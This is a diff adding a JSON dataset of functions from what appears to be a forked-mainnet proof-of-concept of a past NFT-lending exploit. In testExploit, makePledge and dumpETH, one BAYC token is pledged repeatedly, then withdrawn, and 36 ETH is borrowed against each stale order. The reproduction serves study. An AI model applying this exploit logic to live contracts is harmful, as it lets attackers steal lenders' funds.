@@ -1,0 +1,121 @@
+[
+  {
+    "contract/interface": "mainAttackContract",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "mainAttackContract",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "mainAttackContract",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "mainAttackContract",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "mainAttackContract",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "mainAttackContract",
+    "source_type": "attacker_contract",
+    "function_name": "payloads",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "mainAttackContract",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        cheat.createSelectFork(\"mainnet\", 15_028_846); // fork mainnet at block 15028846\n\n        cheat.deal(address(this), 0);\n        emit log_named_decimal_uint(\"[*] Attacker Contract ETH Balance\", address(this).balance, 18);\n\n        // Mainnet TxID: 0x7cd094bc34c6700090f88950ab0095a95eb0d54c8e5012f1f46266c8871027ff\n        emit log_string(\"\\tAttacker send BAYC#5110 to Attack Contract...\");\n        cheat.roll(15_028_846);\n        cheat.startPrank(attacker);\n        BAYC.transferFrom(attacker, address(this), 5110);\n        cheat.stopPrank();\n    }\n\n    // [Main Attack Contract].0xadf6a75d()\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "mainAttackContract",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "mainAttackContract",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "mainAttackContract",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "mainAttackContract",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "mainAttackContract",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "mainAttackContract",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "mainAttackContract",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public {\n        // Set msg.sender = 0xf70f691d30ce23786cfb3a1522cfd76d159aca8d (Main Attack Contract)\n        // Set tx.origin = 0xb7CBB4d43F1e08327A90B32A8417688C9D0B800a (Attacker)\n        cheat.startPrank(address(this), attacker);\n\n        emit log_string(\"[Exploit] Making pledged record...\");\n        for (uint8 i = 0; i < payloads.length; ++i) {\n            payloadContract payload = new payloadContract();\n            cheat.deal(address(payload), 0); // Set balance 0 ETH to avoid conflict on forknet\n            payloads[i] = payable(address(payload));\n\n            BAYC.transferFrom(address(this), address(payloads[i]), 5110);\n            require(BAYC.ownerOf(5110) == payloads[i], \"BAYC#5110 Transfer Failed\");\n\n            payload.makePledge();\n        }\n\n        assert(payloads[0] != address(0));\n        assert(payloads[32] != address(0));\n\n        emit log_string(\"[Exploit] Dumping ETH from borrow...\");\n        for (uint8 i = 0; i < payloads.length; ++i) {\n            payloads[i].call(abi.encodeWithSignature(\"dumpETH()\"));\n        }\n\n        emit log_string(\"[*] Exploit Execution Completed!\");\n        emit log_named_decimal_uint(\"[*] Attacker Contract ETH Balance\", address(this).balance, 18);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "payloadContract",
+    "source_type": "attacker_contract",
+    "function_name": "dumpETH",
+    "original_code": "    function dumpETH() public {\n        XToken.borrow(orderId, payable(address(this)), 36 ether);\n        payable(msg.sender).transfer(address(this).balance);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "payloadContract",
+    "source_type": "attacker_contract",
+    "function_name": "makePledge",
+    "original_code": "    function makePledge() public {\n        BAYC.setApprovalForAll(address(XNFT), true);\n\n        // Attacker was call `pledgeAndBorrow()`, But `pledge()` also vulnerable.\n        XNFT.pledgeAndBorrow(address(BAYC), 5110, 721, address(doNothing), 0);\n\n        orderId = XNFT.counter();\n        assert(orderId >= 11); // Attacker start by orderId:11\n        XNFT.withdrawNFT(orderId);\n\n        BAYC.transferFrom(address(this), msg.sender, 5110);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "payloadContract",
+    "source_type": "attacker_contract",
+    "function_name": "onERC721Received",
+    "original_code": "    function onERC721Received(\n        address operator,\n        address from,\n        uint256 tokenId,\n        bytes calldata data\n    ) external pure returns (bytes4) {\n        return this.onERC721Received.selector;\n    }\n\n",
+    "description": ""
+  }
+]
